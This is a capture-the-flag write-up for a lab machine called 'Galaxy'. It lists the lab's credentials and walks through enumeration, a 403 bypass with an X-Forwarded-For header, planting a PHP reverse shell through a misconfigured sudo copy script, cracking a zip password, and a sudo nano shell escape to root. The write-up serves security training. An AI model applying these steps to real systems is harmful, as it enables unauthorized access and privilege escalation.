# [Galaxy]

## Introduction

Galaxy is medium level machine In this challenge, machine hosting a beta website about facts. The site was vulnerable to bypassing the 403 Forbidden restriction using the X-Forwarded-For header. After successfully bypassing the restriction, I accessed the "doston" user account, where their password was leaked. The "doston" user had a custom .sh file that, we can exploit to gain shell access as the www-data user. This user had access to a .zip file under /var/www/html/developers. After cracking the zip file, the "master" user's password was exposed, allowing me to run nano without a password.

## Info for HTB

### Access

Passwords:

| User  | Password                            |
| ----- | ----------------------------------- |
| master | master6633 |
| doston | Ab401c |
| root  | root8618 |

### Key Processes

1) SSH server on 22 port
2) Apache2 server on 80 port which is vulnerable to http host header
3) There is custom copy.sh file in doston user's home directory which is allowed it to run without password for doston user
4) There is infodevs.zip file in /var/www/html/developers directory with password blink182 (which is crackable under 3 minute)
5) /usr/bin/nano tool allowed to run with sudo without password for master.

### Automation / Crons
There is no automation

### Firewall Rules

There is no firewall rule

### Docker

There is no docker

### Other

1)I made my own ip address to redirect to galaxy.htb in /etc/apache2/sites-avialabel/000-default.conf<br>
2) I specifically made website unable to see .zip file<br>
3) I specifically made doston user unable to see following directory and files: <br>/etc/passwd<br> /etc/shells/<br> /home (but can access it's own directory)<br> /var


# Writeup

# Enumeration

We begin enumeration with nmap tools from ports of target:<br>
`sudo nmap -sC -sV 192.168.2.110 -p- --min-rate=1000 -T4`<br>
`-sC` This flag for basic scripting<br>
`-sV` This flag for to check version<br>
`-p-` To check all ports we do not want to miss any<br>
`-T4` This flag to make scaning slightly faster (default -T3 when you don't specify)<br>
`--min-rate=1000` This is minimum rate of nmap packets<br>

![image](https://github.com/user-attachments/assets/0ceb7925-bc85-46b2-a07c-a15b77d72ce6)

We can see there are 22 and 80 port open. Website has galaxy.htb domain we need to add that domain with it's IP to our /etc/hosts file :<br>
```
echo "192.168.2.110       galaxy.htb" | sudo tee -a /etc/hosts
```
Website looks like blog about cosmos and it is in beta version
<br>
<br>
![image](https://github.com/user-attachments/assets/402a2623-84b0-4d82-97a7-1fbe5681ee21)

Let's enumerate directories and subdirectories using ffuf tool:<br>
```
ffuf -u http://galaxy.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
```
<br>
We find /developers and /photos directories and /developers directory gives us 403 forbidden error<br>

![image](https://github.com/user-attachments/assets/27c54f85-4952-4b13-8040-9c07dea34883)
<br>
Trying to enumerate any subdomains other directory leads us nothing. So we try to find a way to access /developers directory.<br>
Googling 403 bypass error we find [this](https://github.com/justdoston/403-Bypass) documentation.<br>
According to documentation trying to add forward headers with 127.0.0.1 ip will work, because server will think user trying to access from internal IP address.<br>

Let's use proxy forwarding tool such as burp suite to manupulate and try this technique.<br>
![image](https://github.com/user-attachments/assets/605568f6-ecb7-4b28-a860-f5d9f7f40430)


`X-Forwarded-For: 127.0.0.1` header successfuly worked to bypass<br>
![image](https://github.com/user-attachments/assets/5dd16a1c-d07d-482a-bb48-c757fe1961a4)

# Foothold

We use same technique to see content of README.md file:<br>
```
Message from team leader!!!

Attention Developers!

I will not be able to come to the office next week, and I have already discussed the matter with the manager. 

As we all know, we have important ongoing projects that need to be completed. We cannot afford delays or hit a dead end.

To ensure progress continues, I created temporary user with my name. You can log in using the password: Ab401c. 

However, please use ONLY my user to transfer completed web files and consider /developers directory as testing directory. 

Please prioritize completing the project during this time.

Best regards,
Doston
```

<br>
Accoridng to message for some reason team leader is not avialable next weak and he created temporary user with his name which is `doston` let's try to login via ssh<br>

![image](https://github.com/user-attachments/assets/afb30792-72f1-4ba8-9bcb-2b82cd112ed4)
<br>
We are in! user flag can be found from /home/doston/user.txt <br>
doston user has limited and restricted access which is not default. We can not enumerate web directory nor we can not know possible usernames for lateral movement.<br>
![image](https://github.com/user-attachments/assets/1a9203e6-5794-4822-8575-e9d801120e3f)
<br>
But our user allowed to run copy.sh file as sudo without password:<br>
`sudo -l`<br>
```
$ sudo -l
Matching Defaults entries for doston on galaxy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User doston may run the following commands on galaxy:
    (ALL) NOPASSWD: /home/doston/copy.sh
```
Let's analyze content of copy.sh file:<br>
```
#!/bin/bash


target_dir="/var/www/html/developers"


if [ ! -d "$target_dir" ]; then
    echo "Target directory $target_dir does not exist. Creating it now."
    sudo mkdir -p "$target_dir"
    sudo chown $(whoami):$(whoami) "$target_dir"
fi


read -p "Enter the full path of the file to copy: " file_path


if [ ! -e "$file_path" ]; then
    echo "Error: The file does not exist."
    exit 1
fi


if [[ "$file_path" != /home/doston/* ]]; then
    echo "Error: Only files from /home/doston directory are allowed."
    exit 1
fi


if [ -L "$file_path" ]; then
    echo "Error: The file is a symlink and cannot be copied."
    exit 1
fi


inode_count=$(stat --format=%h "$file_path")
if [ "$inode_count" -gt 1 ]; then
    echo "Error: The file is a hard link and cannot be copied."
    exit 1
fi


cp "$file_path" "$target_dir"
if [ $? -eq 0 ]; then
    echo "File successfully copied to $target_dir."
else
    echo "Error: Failed to copy the file."
    exit 1
fi
```
This script checks /var/www/html/developers directory whether exist or not, if it doesn't exist it creates and makes our current use as owner<br>
If /var/www/html/developers exist it asks file to copy it to that directory. Script allows only files from our home directory and doesn't allow to copy symlink or hardlinks<br>
We can not modify or delete to create other to spawn root shell, but when we copy file to /var/www/html/developers directory we can access it from brauser.
Let's use simple php script to test if brauser executes we can get web shell then we will try to enumerate further.<br>
test.php:
```
<?php echo "Hello, World!" ?>
```
We will use copy.sh with sudo to copy it to developers directory:<br>
```
$ cat test.php                                                                                                                                                          
<?php echo "Hello, World!" ?>                                                                                                                                           
$ sudo /home/doston/copy.sh                                                                                                                                             
Enter the full path of the file to copy: /home/doston/test.php                                                                                                          
File successfully copied to /var/www/html/developers.                                                                                                                   
```
After copying it we will try to access from brauser: http://galaxy.htb/developers/test.php do not forget `X-Forwarded-For: 127.0.0.1` header<br>
![image](https://github.com/user-attachments/assets/be40a72f-1d39-49d5-8838-97a39a8bed43)


Our php code executed! Now we will use pentest monkey or similiar php reverse shell to copy it to developers directory then we execute it by browsing the location
<br>
I will use ftp to transfer files you can use your favorite method<br>
Command to simple ftp server from our own machine: `python3 -m pyftpdlib -p21 -w` It also allows anonymous login<br>
Command to connect from doston user: `ftp IP 21`
```
$ ftp 192.168.2.107 21                                                                                                                                                  
Connected to 192.168.2.107.
220 pyftpdlib 2.0.1 ready.
Name (192.168.2.107): anonymous
331 Username ok, send password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> get php-reverse-shell.php
local: php-reverse-shell.php remote: php-reverse-shell.php
229 Entering extended passive mode (|||36581|).
125 Data connection already open. Transfer starting.
100% |***************************************************************************************************************************|  5495       50.87 MiB/s    00:00 ETA
226 Transfer complete.
5495 bytes received in 00:00 (4.36 MiB/s)
ftp> 
```
We exit from ftp and we use copy.sh script to put our web shell to developers directory:<br>
```
$ sudo ./copy.sh
Enter the full path of the file to copy: /home/doston/php-reverse-shell.php
File successfully copied to /var/www/html/developers.
```
Last step we will execute our php shell by brawsing to `http://galaxy.htb/developers/php-reverse-shell.php` don't forget `X-Forwarded-For: 127.0.0.1` header<br>
![image](https://github.com/user-attachments/assets/125a09ee-83ea-4d67-9345-5ffdf37a6ba0)


# Lateral Movement 

After getting web shell enumeration leads us to /var/www/html/developer direcotry and we will find `infodevs.zip` file there is no other interesting file or script.<br>
![image](https://github.com/user-attachments/assets/8ff88573-16ad-4a85-9f10-df70fd8b3b76)

I transfer zip file to my own machine using above ftp server method<br>

Zip file has password, Ab401c didn't work since we don't have other password we will try to use cracking tool `john` 

1) First we need to make hash of password using `zip2john` : `zip2john infodevs.zip > hash.txt`<br>
2) Then we will target hash.txt file to crack using rockyou.txt wordlists: `john hash.txt -w /usr/share/wordlists/rockyou.txt`
```
<SNIP>
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Proceeding with wordlist:/usr/share/john/password.lst
Press 'q' or Ctrl-C to abort, almost any other key for status
blink182         (infodevs.zip/infodevs.txt)     
1g 0:00:00:00 DONE (2024-12-16 18:04) 50.00g/s 177300p/s 177300c/s 177300C/s 123456..sss
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
and we have password ! `blink182`

After extracting file infodevs.txt has users password:
```
└─$ cat infodevs.txt 
Developers user pass!

Temporary % 
System Administrator ^
Team leader *
New developer $

john:12j31 ^
alice:al213 $
master:master6633 * 
doston:Ab401c %
```

# Privilege Escalation

We can see owner of file marked users with it's own rule, he marked team leader as `*` and he marked temprorary user as `%`.<br>
If we remember first message we got from `developers` directory in the README.md file first lane it said `Message from team leader!!!`<br>
He created that temporary `doston` user which makes sense it marked as temporary. Let's try to login to `master` using ssh
![image](https://github.com/user-attachments/assets/5a6e3b4a-867e-4326-9a05-c5e08587417f)

Now we have access to `master` user.
Searching for suid bit or capabilities we can't find anything usefull, let's see what user allowed to use as `sudo`
```
master@galaxy:~$ sudo -l
Matching Defaults entries for master on galaxy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User master may run the following commands on galaxy:
    (ALL) NOPASSWD: /usr/bin/nano
master@galaxy:~$ 
```
User `master` allowed to use `/usr/bin/nano` without password. Googling possible exploitation we can see [this](https://gtfobins.github.io/gtfobins/nano/#sudo) from gtfobins website<br>
![image](https://github.com/user-attachments/assets/e7a7c544-2ebb-4ed9-8be8-c3e83b09b1fe)<br>
Let's try this technique<br>
`sudo nano`
You don't need to write anything<br>
1) Hit Ctrl+r
2) Then hit Ctrl+x
3) Then type `reset; sh 1>&0 2>&0` hit enter<br>
![image](https://github.com/user-attachments/assets/690c4b6e-eaaa-45fe-b0bf-9144284c4339)

We have root!



